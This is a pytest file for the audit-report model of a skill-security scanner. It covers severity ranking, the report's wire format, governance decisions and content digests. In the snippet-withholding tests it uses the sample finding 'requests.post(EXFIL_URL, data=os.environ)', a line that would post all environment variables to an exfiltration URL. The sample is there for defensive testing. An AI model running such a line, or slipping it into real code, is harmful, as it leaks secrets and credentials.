# Copyright(C) 2025-2026 Advanced Micro Devices, Inc. All rights reserved.
# SPDX-License-Identifier: MIT
"""
The audit report data model (issue #2468).

Covers the wire shape the hub Worker consumes
(``workers/agent-hub/src/audit.ts``), the ``GovernanceDecision`` projection, and
the content digest that binds a report to the bytes it audited.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from gaia.skills.audit import (
    AUDIT_ENGINE,
    SEVERITY_ORDER,
    AuditReport,
    Finding,
    content_digest,
    worst_severity,
)


def _finding(**overrides) -> Finding:
    defaults = dict(
        rule_id="code.shell.subprocess",
        severity="high",
        category="dangerous-call",
        message="Spawns a subprocess.",
        file="tools.py",
        line=12,
        remediation="Declare 'shell:execute' or drop the call.",
    )
    defaults.update(overrides)
    return Finding(**defaults)


def _report(**overrides) -> AuditReport:
    defaults = dict(
        skill="web-research",
        version="1.2.0",
        security_tier="community",
        verdict="ALLOW",
        reason="No findings above the community threshold.",
        findings=(),
        cleared_tiers=("experimental", "community"),
        content_digest="sha256:" + "ab" * 32,
        audited_at="2026-07-30T09:00:00+00:00",
    )
    defaults.update(overrides)
    return AuditReport(**defaults)


# ----------------------------------------------------------------------
# Severity ordering
# ----------------------------------------------------------------------


def test_severity_order_ranks_critical_above_info():
    assert SEVERITY_ORDER.index("critical") > SEVERITY_ORDER.index("info")


def test_worst_severity_of_no_findings_is_none():
    assert worst_severity(()) is None


def test_worst_severity_picks_the_highest_not_the_first():
    findings = (_finding(severity="low"), _finding(severity="critical"), _finding())
    assert worst_severity(findings) == "critical"


def test_finding_rejects_an_unknown_severity():
    with pytest.raises(ValueError, match="severity"):
        _finding(severity="catastrophic")


# ----------------------------------------------------------------------
# The wire shape the hub Worker parses
# ----------------------------------------------------------------------


def test_report_to_dict_carries_every_field_audit_ts_requires():
    payload = _report().to_dict()
    # audit.ts parseAuditReport() hard-requires these four.
    assert payload["verdict"] == "ALLOW"
    assert payload["engine"] == AUDIT_ENGINE
    assert payload["audited_at"] == "2026-07-30T09:00:00+00:00"
    assert isinstance(payload["findings"], list)


def test_report_to_dict_binds_the_verdict_to_skill_version_tier_and_bytes():
    """Without these the Worker cannot tell a replayed report from a fresh one."""
    payload = _report().to_dict()
    assert payload["skill"] == "web-research"
    assert payload["version"] == "1.2.0"
    assert payload["security_tier"] == "community"
    assert payload["cleared_tiers"] == ["experimental", "community"]
    assert payload["content_digest"] == "sha256:" + "ab" * 32


def test_engine_id_is_versioned():
    assert AUDIT_ENGINE.startswith("gaia-skill-audit/")
    assert AUDIT_ENGINE.split("/", 1)[1]


def test_report_round_trips_through_its_dict():
    original = _report(findings=(_finding(),))
    assert AuditReport.from_dict(original.to_dict()) == original


def test_finding_to_dict_names_file_line_and_the_fix():
    payload = _finding().to_dict()
    assert payload["file"] == "tools.py"
    assert payload["line"] == 12
    assert payload["remediation"]
    assert payload["rule_id"] == "code.shell.subprocess"


# ----------------------------------------------------------------------
# Private-disclosure policy: exploitable detail is opt-in
# ----------------------------------------------------------------------


def test_snippets_are_withheld_from_the_default_payload():
    """CLAUDE.md's security policy: no public dump of exploitable detail."""
    finding = _finding(snippet="requests.post(EXFIL_URL, data=os.environ)")
    assert "snippet" not in finding.to_dict()


def test_snippets_are_included_only_when_explicitly_requested():
    finding = _finding(snippet="requests.post(EXFIL_URL, data=os.environ)")
    payload = finding.to_dict(include_snippets=True)
    assert payload["snippet"] == "requests.post(EXFIL_URL, data=os.environ)"


def test_report_payload_withholds_snippets_by_default():
    report = _report(findings=(_finding(snippet="secret detail"),))
    assert "snippet" not in report.to_dict()["findings"][0]
    assert (
        report.to_dict(include_snippets=True)["findings"][0]["snippet"]
        == "secret detail"
    )


# ----------------------------------------------------------------------
# GovernanceDecision projection
# ----------------------------------------------------------------------


def test_report_projects_onto_a_governance_decision():
    report = _report(verdict="REVIEW", findings=(_finding(rule_id="body.injection"),))
    decision = report.to_governance_decision()
    assert decision.decision == "REVIEW"
    assert decision.reason == report.reason
    assert decision.rule_ids == ["body.injection"]
    assert decision.policy_version == AUDIT_ENGINE


def test_governance_decision_rule_ids_are_deduplicated_in_first_seen_order():
    report = _report(
        findings=(
            _finding(rule_id="b.rule"),
            _finding(rule_id="a.rule"),
            _finding(rule_id="b.rule"),
        )
    )
    assert report.to_governance_decision().rule_ids == ["b.rule", "a.rule"]


# ----------------------------------------------------------------------
# Content digest — binds a report to the bytes it audited
# ----------------------------------------------------------------------


def _skill_dir(root: Path, *, body: str = "# Body\n", tools: str = "x = 1\n") -> Path:
    directory = root / "s"
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "SKILL.md").write_text(body, encoding="utf-8")
    (directory / "tools.py").write_text(tools, encoding="utf-8")
    return directory


def test_content_digest_is_prefixed_and_hex(tmp_path):
    digest = content_digest(_skill_dir(tmp_path))
    algorithm, _, hexdigest = digest.partition(":")
    assert algorithm == "sha256"
    assert len(hexdigest) == 64
    assert int(hexdigest, 16) >= 0


def test_content_digest_is_stable_across_calls(tmp_path):
    directory = _skill_dir(tmp_path)
    assert content_digest(directory) == content_digest(directory)


def test_content_digest_changes_when_the_body_changes(tmp_path):
    directory = _skill_dir(tmp_path)
    before = content_digest(directory)
    (directory / "SKILL.md").write_text("# Different\n", encoding="utf-8")
    assert content_digest(directory) != before


def test_content_digest_changes_when_tools_change(tmp_path):
    directory = _skill_dir(tmp_path)
    before = content_digest(directory)
    (directory / "tools.py").write_text("x = 2\n", encoding="utf-8")
    assert content_digest(directory) != before


def test_content_digest_covers_scripts(tmp_path):
    directory = _skill_dir(tmp_path)
    before = content_digest(directory)
    scripts = directory / "scripts"
    scripts.mkdir()
    (scripts / "run.py").write_text("print(1)\n", encoding="utf-8")
    assert content_digest(directory) != before


def test_content_digest_ignores_caches_and_untracked_noise(tmp_path):
    """A __pycache__ appearing must not invalidate a valid audit report."""
    directory = _skill_dir(tmp_path)
    before = content_digest(directory)
    cache = directory / "__pycache__"
    cache.mkdir()
    (cache / "tools.cpython-312.pyc").write_bytes(b"\x00\x01")
    assert content_digest(directory) == before


def test_content_digest_distinguishes_a_rename(tmp_path):
    """Same bytes under a different filename must not collide."""
    directory = _skill_dir(tmp_path)
    (directory / "scripts").mkdir()
    (directory / "scripts" / "a.py").write_text("payload\n", encoding="utf-8")
    first = content_digest(directory)
    (directory / "scripts" / "a.py").rename(directory / "scripts" / "b.py")
    assert content_digest(directory) != first
